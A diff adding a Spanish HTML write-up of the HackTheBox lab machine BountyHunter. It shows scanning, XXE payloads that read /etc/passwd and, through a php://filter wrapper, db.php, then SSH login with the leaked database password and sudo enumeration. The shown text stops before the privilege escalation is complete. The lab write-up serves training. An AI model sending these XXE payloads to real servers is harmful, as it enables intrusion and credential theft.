@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB: BountyHunter — fl0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f7f6f3;
+      --bg2: #ffffff;
+      --bg3: #edecea;
+      --text: #1a1917;
+      --text2: #5a584f;
+      --text3: #9a9890;
+      --accent: #c8382b;
+      --accent2: #e85d52;
+      --border: #d8d6d0;
+      --border2: #c0bdb5;
+      --mono: 'JetBrains Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+      --radius: 6px;
+      --radius-lg: 12px;
+    }
+
+    body.dark {
+      --bg: #111110;
+      --bg2: #1a1917;
+      --bg3: #222120;
+      --text: #e8e4dc;
+      --text2: #a09c94;
+      --text3: #5a5850;
+      --border: #2a2826;
+      --border2: #3a3834;
+    }
+    body.dark nav { background: rgba(17,17,16,0.88); }
+    body.dark footer { background: #0e0e0d; }
+    body.dark .code-block { background: #0e0e0d; border-color: #2a2826; }
+    body.dark .info-table { background: #0e0e0d; }
+
+    html { scroll-behavior: smooth; max-width: 100%; overflow-x: hidden; }
+    body { max-width: 100%; }
+    body {
+      font-family: var(--sans);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* ── CURSOR ── */
+    .cursor {
+      width: 8px; height: 8px;
+      background: var(--accent);
+      border-radius: 50%;
+      position: fixed; pointer-events: none;
+      z-index: 9999;
+      transition: transform 0.15s ease, opacity 0.2s;
+      transform: translate(-50%, -50%);
+    }
+    .cursor-ring {
+      width: 32px; height: 32px;
+      border: 1px solid var(--accent);
+      border-radius: 50%;
+      position: fixed; pointer-events: none;
+      z-index: 9998;
+      transition: transform 0.35s ease, opacity 0.3s;
+      transform: translate(-50%, -50%);
+      opacity: 0.5;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 48px; height: 64px;
+      background: rgba(247,246,243,0.88);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-logo {
+      font-family: var(--mono); font-size: 14px; font-weight: 500;
+      color: var(--text); text-decoration: none;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .nav-logo .bracket { color: var(--text3); }
+    .nav-logo .name em { color: var(--accent); font-style: normal; }
+    .nav-back {
+      font-family: var(--mono); font-size: 12px;
+      color: var(--text2); text-decoration: none;
+      letter-spacing: 0.04em;
+      display: flex; align-items: center; gap: 6px;
+      transition: color 0.2s;
+    }
+    .nav-back:hover { color: var(--accent); }
+    .nav-right { display: flex; align-items: center; gap: 24px; }
+
+    .theme-toggle {
+      display: flex; align-items: center; gap: 6px;
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); cursor: pointer;
+      background: none; border: 1px solid var(--border);
+      padding: 6px 12px; border-radius: var(--radius);
+      transition: border-color 0.2s, color 0.2s;
+    }
+    .theme-toggle:hover { border-color: var(--accent); color: var(--accent); }
+
+    /* ── HERO ── */
+    .writeup-hero {
+      padding: 120px 48px 64px;
+      border-bottom: 1px solid var(--border);
+      background: var(--bg2);
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-grid-bg {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(var(--border) 1px, transparent 1px),
+        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 48px 48px;
+      opacity: 0.25;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 860px; }
+
+    .hero-breadcrumb {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.08em;
+      margin-bottom: 24px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .hero-breadcrumb a { color: var(--text3); text-decoration: none; transition: color 0.2s; }
+    .hero-breadcrumb a:hover { color: var(--accent); }
+    .hero-breadcrumb span { color: var(--border2); }
+
+    .writeup-hero h1 {
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 300;
+      letter-spacing: -0.03em;
+      line-height: 1.05;
+      margin-bottom: 20px;
+    }
+    .writeup-hero h1 em { font-style: normal; color: var(--accent); }
+
+    .hero-meta {
+      display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+      margin-bottom: 32px;
+    }
+    .meta-badge {
+      font-family: var(--mono); font-size: 10px;
+      padding: 4px 12px; border-radius: 100px;
+      letter-spacing: 0.06em;
+      border: 1px solid var(--border);
+      background: var(--bg);
+      color: var(--text2);
+    }
+    .meta-badge.easy { background: #e8f5e9; color: #2e7d32; border-color: #c8e6c9; }
+    .meta-badge.os   { background: #fff0ef; color: var(--accent); border-color: #f0c8c4; }
+    .meta-badge.date { color: var(--text3); }
+
+    .hero-techniques {
+      display: flex; flex-wrap: wrap; gap: 8px;
+    }
+    .tech-tag {
+      font-family: var(--mono); font-size: 11px;
+      padding: 5px 12px; border-radius: var(--radius);
+      background: var(--bg3); border: 1px solid var(--border);
+      color: var(--text2); letter-spacing: 0.03em;
+    }
+
+    /* ── LAYOUT ── */
+    .writeup-layout {
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      gap: 0;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 48px;
+      align-items: start;
+      width: 100%;
+    }
+
+    /* ── TOC ── */
+    .toc {
+      position: sticky; top: 88px;
+      padding: 40px 0 40px 0;
+      padding-right: 48px;
+      border-right: 1px solid var(--border);
+    }
+    .toc-title {
+      font-family: var(--mono); font-size: 10px;
+      color: var(--text3); letter-spacing: 0.12em;
+      text-transform: uppercase; margin-bottom: 16px;
+    }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
+    .toc-list a {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); text-decoration: none;
+      letter-spacing: 0.03em;
+      padding: 5px 8px; border-radius: var(--radius);
+      display: block;
+      transition: background 0.15s, color 0.15s;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--accent); background: var(--bg3); border-left-color: var(--accent); }
+    .toc-list a.sub { padding-left: 20px; font-size: 10px; }
+
+    /* ── CONTENT ── */
+    .writeup-content {
+      padding: 48px 0 80px 48px;
+      max-width: 720px;
+      min-width: 0;
+      width: 100%;
+    }
+
+    .writeup-section { margin-bottom: 64px; }
+
+    .section-label {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.12em;
+      text-transform: uppercase; margin-bottom: 12px;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .section-label::after {
+      content: ''; flex: 1; max-width: 48px;
+      height: 1px; background: var(--border2);
+    }
+
+    .writeup-content h2 {
+      font-size: 26px; font-weight: 400;
+      letter-spacing: -0.02em;
+      color: var(--text); margin-bottom: 24px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+    .writeup-content h2 em { font-style: normal; color: var(--accent); }
+
+    .writeup-content h3 {
+      font-family: var(--mono); font-size: 13px;
+      font-weight: 500; color: var(--text);
+      margin: 32px 0 12px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .writeup-content h3::before {
+      content: '##';
+      color: var(--accent); font-size: 11px;
+    }
+
+    .writeup-content p {
+      font-size: 15px; color: var(--text2);
+      line-height: 1.8; margin-bottom: 16px;
+    }
+
+    code {
+      font-family: var(--mono); font-size: 12px;
+      background: var(--bg3); border: 1px solid var(--border);
+      padding: 2px 6px; border-radius: 4px;
+      color: var(--accent);
+    }
+
+    /* ── CODE BLOCK ── */
+    .code-block {
+      background: #1a1917;
+      border: 1px solid #3a3834;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      margin: 20px 0;
+      width: 100%;
+      min-width: 0;
+      max-width: 100%;
+    }
+    .code-bar {
+      background: #252420;
+      padding: 10px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid #3a3834;
+    }
+    .code-bar-left { display: flex; align-items: center; gap: 8px; }
+    .code-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .code-lang {
+      font-family: var(--mono); font-size: 10px;
+      color: #6b6860; letter-spacing: 0.08em; text-transform: uppercase;
+    }
+    .code-copy {
+      font-family: var(--mono); font-size: 10px;
+      color: #5a5850; cursor: pointer; background: none;
+      border: none; letter-spacing: 0.06em;
+      transition: color 0.2s;
+    }
+    .code-copy:hover { color: #c8c4bc; }
+    .code-body {
+      padding: 20px;
+      font-family: var(--mono); font-size: 12.5px;
+      line-height: 1.85; color: #c8c4bc;
+      overflow-x: auto;
+      white-space: pre;
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+      -webkit-overflow-scrolling: touch;
+    }
+    .code-body .c-prompt { color: #688f6a; }
+    .code-body .c-cmd    { color: #e8e4dc; }
+    .code-body .c-flag   { color: #7ab0e8; }
+    .code-body .c-str    { color: #8eb87a; }
+    .code-body .c-key    { color: #c8382b; }
+    .code-body .c-comment{ color: #5a5850; }
+    .code-body .c-tag    { color: #d4a84a; }
+    .code-body .c-attr   { color: #7ab0e8; }
+    .code-body .c-val    { color: #8eb87a; }
+
+    /* ── INFO TABLE ── */
+    .info-table {
+      width: 100%; border-collapse: separate; border-spacing: 0;
+      background: var(--bg2); border: 1px solid var(--border);
+      border-radius: var(--radius-lg); overflow: hidden;
+      margin-bottom: 32px; font-size: 13px;
+    }
+    .info-table tr { border-bottom: 1px solid var(--border); }
+    .info-table tr:last-child { border-bottom: none; }
+    .info-table td { padding: 12px 20px; vertical-align: middle; }
+    .info-table td:first-child {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.06em;
+      text-transform: uppercase; width: 140px;
+      background: var(--bg3); border-right: 1px solid var(--border);
+    }
+    .info-table td:last-child { color: var(--text2); }
+
+    /* ── CALLOUT ── */
+    .callout {
+      border-left: 3px solid var(--accent);
+      background: #fff0ef;
+      border-radius: 0 var(--radius) var(--radius) 0;
+      padding: 16px 20px; margin: 20px 0;
+    }
+    body.dark .callout { background: #2a1a18; }
+    .callout-title {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--accent); letter-spacing: 0.08em;
+      text-transform: uppercase; margin-bottom: 6px;
+    }
+    .callout p { font-size: 14px; margin-bottom: 0; }
+
+    /* ── SCREENSHOT ── */
+    .screenshot {
+      margin: 20px 0; border-radius: var(--radius-lg);
+      border: 1px solid var(--border); overflow: hidden;
+    }
+    .screenshot-bar {
+      background: var(--bg3); padding: 8px 14px;
+      display: flex; align-items: center; gap: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+    .screenshot-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border2); }
+    .screenshot-label {
+      font-family: var(--mono); font-size: 10px;
+      color: var(--text3); letter-spacing: 0.06em;
+    }
+    .screenshot img { width: 100%; display: block; }
+
+    /* ── LESSONS ── */
+    .lessons-list { display: flex; flex-direction: column; gap: 16px; margin-top: 8px; }
+    .lesson-item {
+      display: flex; gap: 16px; align-items: flex-start;
+      background: var(--bg2); border: 1px solid var(--border);
+      border-radius: var(--radius-lg); padding: 20px;
+      transition: border-color 0.2s;
+    }
+    .lesson-item:hover { border-color: var(--accent); }
+    .lesson-num {
+      font-family: var(--mono); font-size: 20px;
+      font-weight: 300; color: var(--border2);
+      flex-shrink: 0; width: 32px; line-height: 1;
+      padding-top: 2px;
+    }
+    .lesson-body { }
+    .lesson-title {
+      font-family: var(--mono); font-size: 13px;
+      font-weight: 500; color: var(--text);
+      margin-bottom: 6px;
+    }
+    .lesson-desc { font-size: 14px; color: var(--text2); line-height: 1.7; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--bg2);
+      border-top: 1px solid var(--border);
+      padding: 32px 48px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .footer-logo {
+      font-family: var(--mono); font-size: 13px;
+      color: var(--text3);
+    }
+    .footer-logo em { color: var(--accent); font-style: normal; }
+    .footer-copy { font-size: 13px; color: var(--text3); }
+
+    /* ── REVEAL ── */
+    .reveal { opacity: 0; transform: translateY(16px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .reveal.visible { opacity: 1; transform: none; }
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 180px 1fr; }
+      .writeup-content { padding-left: 32px; }
+      .toc { padding-right: 24px; }
+    }
+
+    @media (max-width: 768px) {
+      nav { padding: 0 20px; }
+      .nav-back { display: none; }
+      .writeup-hero { padding: 88px 20px 40px; }
+      .writeup-layout {
+        grid-template-columns: minmax(0, 1fr);
+        padding: 0 20px;
+        width: 100%;
+      }
+      .toc { display: none; }
+      .writeup-content {
+        padding: 32px 0 60px;
+        max-width: 100%;
+        width: 100%;
+        min-width: 0;
+      }
+      .writeup-content h2 { font-size: 22px; }
+      .writeup-content h3 { font-size: 12px; margin: 28px 0 10px; }
+      .writeup-content p { font-size: 14px; }
+
+      .info-table { font-size: 12px; }
+      .info-table td { padding: 10px 12px; }
+      .info-table td:first-child { width: 100px; }
+
+      .code-block { margin: 16px 0; border-radius: var(--radius); }
+      .code-body {
+        padding: 14px;
+        font-size: 11px;
+        line-height: 1.7;
+      }
+      .code-bar { padding: 8px 12px; }
+
+      .hero-meta { gap: 8px; }
+      .hero-techniques { gap: 6px; }
+      .tech-tag { font-size: 10px; padding: 4px 10px; }
+
+      .lesson-item { flex-direction: column; gap: 8px; padding: 16px; }
+      .lesson-num { width: auto; font-size: 16px; }
+
+      .callout { padding: 14px 16px; }
+
+      footer {
+        padding: 24px 20px;
+        flex-direction: column;
+        gap: 8px;
+        text-align: center;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .writeup-hero h1 { font-size: 36px; }
+      .meta-badge { font-size: 9px; padding: 3px 10px; }
+      .code-body { font-size: 10px; }
+      .screenshot-label { font-size: 9px; }
+    }
+
+    /* prevent horizontal overflow globally */
+    img, .screenshot {
+      max-width: 100%;
+    }
+    .info-table {
+      display: block;
+      overflow-x: auto;
+      white-space: nowrap;
+    }
+    .info-table tr { display: table-row; }
+    @media (min-width: 769px) {
+      .info-table { display: table; white-space: normal; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursor-ring"></div>
+
+<!-- ── NAV ── -->
+<nav>
+  <a href="../../" class="nav-logo">
+    <span class="bracket">{</span>
+    <span class="name">fl<em>0</em></span>
+    <span class="bracket">}</span>
+  </a>
+  <div class="nav-right">
+    <a href="../../#writeups" class="nav-back">← writeups</a>
+    <button class="theme-toggle" onclick="toggleTheme()">
+      <span id="toggle-icon">🌙</span>
+      <span id="toggle-label">dark</span>
+    </button>
+  </div>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="writeup-hero">
+  <div class="hero-grid-bg"></div>
+  <div class="writeup-hero-content">
+    <div class="hero-breadcrumb">
+      <a href="../../">fl0</a>
+      <span>/</span>
+      <a href="../../#writeups">writeups</a>
+      <span>/</span>
+      bountyhunter
+    </div>
+
+    <h1>Bounty<em>Hunter</em></h1>
+
+    <div class="hero-meta">
+      <span class="meta-badge os">Linux</span>
+      <span class="meta-badge easy">Easy</span>
+      <span class="meta-badge date">12 May 2026</span>
+      <span class="meta-badge">HackTheBox</span>
+    </div>
+
+    <div class="hero-techniques">
+      <span class="tech-tag">XXE Injection</span>
+      <span class="tech-tag">PHP Filter Wrapper</span>
+      <span class="tech-tag">Code Analysis</span>
+      <span class="tech-tag">Python eval() Abuse</span>
+      <span class="tech-tag">eWPT</span>
+    </div>
+  </div>
+</div>
+
+<!-- ── MAIN ── -->
+<div class="writeup-layout">
+
+  <!-- TOC -->
+  <aside class="toc">
+    <div class="toc-title">contenido</div>
+    <ul class="toc-list">
+      <li><a href="#info">Información general</a></li>
+      <li><a href="#recon">Reconocimiento</a></li>
+      <li><a href="#nmap" class="sub">↳ Nmap</a></li>
+      <li><a href="#web" class="sub">↳ Enumeración web</a></li>
+      <li><a href="#burp" class="sub">↳ Análisis Burp</a></li>
+      <li><a href="#explotacion">Explotación</a></li>
+      <li><a href="#xxe" class="sub">↳ XXE</a></li>
+      <li><a href="#wrapper" class="sub">↳ PHP Filter Wrapper</a></li>
+      <li><a href="#foothold">Foothold</a></li>
+      <li><a href="#privesc">Escalada de privilegios</a></li>
+      <li><a href="#lessons">Lecciones aprendidas</a></li>
+    </ul>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content">
+
+    <!-- INFO -->
+    <div class="writeup-section reveal" id="info">
+      <div class="section-label">overview</div>
+      <h2>Información <em>general</em></h2>
+      <table class="info-table">
+        <tr><td>OS</td><td>Linux (Ubuntu)</td></tr>
+        <tr><td>Dificultad</td><td>Easy</td></tr>
+        <tr><td>Plataforma</td><td>HackTheBox</td></tr>
+        <tr><td>Técnicas</td><td>XXE Injection · PHP Filter Wrapper · Python eval() Abuse</td></tr>
+        <tr><td>Certificaciones</td><td>eWPT</td></tr>
+      </table>
+    </div>
+
+    <!-- RECONOCIMIENTO -->
+    <div class="writeup-section reveal" id="recon">
+      <div class="section-label">fase 1</div>
+      <h2><em>Reconocimiento</em></h2>
+
+      <h3 id="nmap">Nmap</h3>
+      <p>Empezamos con un escaneo completo de puertos para identificar la superficie de ataque:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">nmap -p- --open -sCV -T4 -Pn -n 10.129.95.166 -oN scaneonmap.txt -vvv</span></div>
+      </div>
+
+      <p>Resultado relevante:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">output</span>
+          </div>
+        </div>
+        <div class="code-body"><span class="c-tag">PORT</span>   <span class="c-str">STATE</span>  <span class="c-attr">SERVICE</span>  <span class="c-val">VERSION</span>
+<span class="c-key">22/tcp</span>  open   ssh      OpenSSH 8.2p2 Ubuntu
+<span class="c-key">80/tcp</span>  open   http     Apache httpd 2.4.41 (Ubuntu)</div>
+      </div>
+
+      <p>Solo dos puertos abiertos: SSH (22) y HTTP (80). El vector de entrada será la web.</p>
+
+      <h3 id="web">Enumeración web</h3>
+      <p>Enumeramos directorios y extensiones de archivos con <code>ffuf</code>:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-comment"># Directorios</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">ffuf -u http://10.129.95.166/FUZZ \
+     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+     -fc 404,403,500</span>
+
+<span class="c-comment"># Extensiones de interés</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">ffuf -u http://10.129.95.166/FUZZ \
+     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+     -fc 404,403,500 -e .php,.txt,.asp,.bak -s</span></div>
+      </div>
+
+      <p>Encontramos <code>/resources</code> con directory listing activo. Dentro hay un <code>README.txt</code>:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">10.129.95.166/resources/README.txt</span>
+        </div>
+        <img src="img/readme.png" alt="README.txt revelando que la cuenta test está activa con contraseña hasheada" />
+      </div>
+
+      <p>El archivo nos indica que la cuenta <code>test</code> está activa con contraseña hasheada, y que el script de submit ya está implementado. También encontramos <code>db.php</code> (pantalla en blanco por ahora) y <code>log_submit.php</code>:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">10.129.95.166/log_submit.php</span>
+        </div>
+        <img src="img/portal.png" alt="Portal Bounty Report System Beta con formulario de reporte" />
+      </div>
+
+      <h3 id="burp">Análisis de la petición con Burp Suite</h3>
+      <p>Interceptamos la petición al enviar el formulario. El parámetro <code>data</code> lleva <code>%</code> (URL-encode) y <code>==</code> al final (base64). Doble codificación:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">Burp Suite — petición con data codificada</span>
+        </div>
+        <img src="img/burp_encoded.png" alt="Burp mostrando la petición con data en base64+URLencode" />
+      </div>
+
+      <p>Al decodificar (primero URL, luego base64) obtenemos XML plano:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">Burp Suite — XML decodificado</span>
+        </div>
+        <img src="img/burp_decoded.png" alt="XML decodificado mostrando la estructura bugreport" />
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">⚡ Vector identificado</div>
+        <p>La aplicación procesa XML enviado por el cliente sin restricciones. Candidato directo a <strong>XXE (XML External Entity Injection)</strong>.</p>
+      </div>
+    </div>
+
+    <!-- EXPLOTACIÓN -->
+    <div class="writeup-section reveal" id="explotacion">
+      <div class="section-label">fase 2</div>
+      <h2><em>Explotación</em></h2>
+
+      <h3 id="xxe">XXE — Lectura de archivos del sistema</h3>
+      <p>Una vulnerabilidad XXE ocurre cuando el parser XML del servidor procesa entidades externas sin restricciones, permitiendo leer archivos locales como si fueran parte del documento.</p>
+      <p>Construimos el payload, lo codificamos en base64 y luego URL-encode, y lo enviamos en el parámetro <code>data</code>:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">xml</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-tag">&lt;?xml</span> <span class="c-attr">version</span>=<span class="c-str">"1.0"</span> <span class="c-attr">encoding</span>=<span class="c-str">"ISO-8859-1"</span><span class="c-tag">?&gt;</span>
+<span class="c-tag">&lt;!DOCTYPE</span> data [
+  <span class="c-tag">&lt;!ENTITY</span> file <span class="c-key">SYSTEM</span> <span class="c-str">"file:///etc/passwd"</span>&gt;
+]&gt;
+<span class="c-tag">&lt;bugreport&gt;</span>
+  <span class="c-tag">&lt;title&gt;</span>test<span class="c-tag">&lt;/title&gt;</span>
+  <span class="c-tag">&lt;cwe&gt;</span>test<span class="c-tag">&lt;/cwe&gt;</span>
+  <span class="c-tag">&lt;cvss&gt;</span>test<span class="c-tag">&lt;/cvss&gt;</span>
+  <span class="c-tag">&lt;reward&gt;</span>&amp;file;<span class="c-tag">&lt;/reward&gt;</span>
+<span class="c-tag">&lt;/bugreport&gt;</span></div>
+      </div>
+
+      <p>La respuesta devuelve el contenido de <code>/etc/passwd</code>:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">Burp Suite — respuesta con /etc/passwd</span>
+        </div>
+        <img src="img/xxe_passwd.png" alt="Burp mostrando el contenido de /etc/passwd en la respuesta" />
+      </div>
+
+      <p>Del <code>/etc/passwd</code> solo nos interesan los usuarios con shell <code>/bin/bash</code>: <code>root</code> y <code>development</code>.</p>
+
+      <h3 id="wrapper">XXE + PHP Filter Wrapper — Lectura de código fuente PHP</h3>
+      <p>Al intentar leer <code>db.php</code> directamente con <code>file:///var/www/html/db.php</code>, no obtenemos nada. Hay dos motivos:</p>
+      <p><strong>1. Conflicto de sintaxis:</strong> el código PHP contiene <code>&lt;?php</code> y <code>?&gt;</code>, que el parser XML interpreta como etiquetas propias del documento, rompiendo el payload.</p>
+      <p><strong>2. Ejecución server-side:</strong> el servidor ejecuta el PHP antes de devolverlo, ocultando el código fuente.</p>
+
+      <div class="callout">
+        <div class="callout-title">💡 Solución: php://filter wrapper</div>
+        <p>Al usar <code>php://filter/read=convert.base64-encode/resource=...</code> obligamos al servidor a codificar el archivo en base64 <em>antes</em> de insertarlo en la entidad XML. El resultado viaja como texto plano que decodificamos localmente.</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">xml</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-tag">&lt;?xml</span> <span class="c-attr">version</span>=<span class="c-str">"1.0"</span> <span class="c-attr">encoding</span>=<span class="c-str">"ISO-8859-1"</span><span class="c-tag">?&gt;</span>
+<span class="c-tag">&lt;!DOCTYPE</span> data [
+  <span class="c-tag">&lt;!ENTITY</span> file <span class="c-key">SYSTEM</span>
+  <span class="c-str">"php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"</span>&gt;
+]&gt;
+<span class="c-tag">&lt;bugreport&gt;</span>
+  <span class="c-tag">&lt;title&gt;</span>test<span class="c-tag">&lt;/title&gt;</span>
+  <span class="c-tag">&lt;cwe&gt;</span>test<span class="c-tag">&lt;/cwe&gt;</span>
+  <span class="c-tag">&lt;cvss&gt;</span>test<span class="c-tag">&lt;/cvss&gt;</span>
+  <span class="c-tag">&lt;reward&gt;</span>&amp;file;<span class="c-tag">&lt;/reward&gt;</span>
+<span class="c-tag">&lt;/bugreport&gt;</span></div>
+      </div>
+
+      <p>La respuesta devuelve una cadena base64 que al decodificar revela las credenciales de la base de datos:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">php</span>
+          </div>
+        </div>
+        <div class="code-body"><span class="c-comment">// TODO -> Implement login system with the database.</span>
+<span class="c-tag">$dbserver</span>   = <span class="c-str">"localhost"</span>;
+<span class="c-tag">$dbname</span>     = <span class="c-str">"bounty"</span>;
+<span class="c-tag">$dbusername</span> = <span class="c-str">"admin"</span>;
+<span class="c-tag">$dbpassword</span> = <span class="c-key">"m19RoAU0hP41A1sTsq6K"</span>;
+<span class="c-tag">$testuser</span>   = <span class="c-str">"test"</span>;</div>
+      </div>
+    </div>
+
+    <!-- FOOTHOLD -->
+    <div class="writeup-section reveal" id="foothold">
+      <div class="section-label">fase 3</div>
+      <h2><em>Foothold</em></h2>
+
+      <p>Tenemos credenciales. Recordando que del <code>/etc/passwd</code> el único usuario con bash era <code>development</code>, probamos la contraseña por SSH:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">ssh development@10.129.95.166</span>
+<span class="c-comment"># password: m19RoAU0hP41A1sTsq6K</span>
+
+development@bountyhunter:~$ <span class="c-cmd">export TERM=xterm</span>
+development@bountyhunter:~$ <span class="c-cmd">cat user.txt</span>
+<span class="c-str">HTB{...}</span> <span class="c-comment"># flag de usuario ✓</span></div>
+      </div>
+
+      <p>La contraseña del archivo de configuración era válida para el usuario del sistema. En el directorio home también encontramos un <code>contract.txt</code> que menciona permisos para ejecutar un script de validación de tickets.</p>
+    </div>
+
+    <!-- PRIVESC -->
+    <div class="writeup-section reveal" id="privesc">
+      <div class="section-label">fase 4</div>
+      <h2>Escalada de <em>privilegios</em></h2>
+
+      <h3>Enumeración sudo</h3>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body">development@bountyhunter:~$ <span class="c-cmd">sudo -l</span>
+
+User development may run the following commands on bountyhunter:
+  <span class="c-key">(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span></div>
+      </div>
+
+      <p>Podemos ejecutar el script como root sin contraseña. Lo analizamos:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
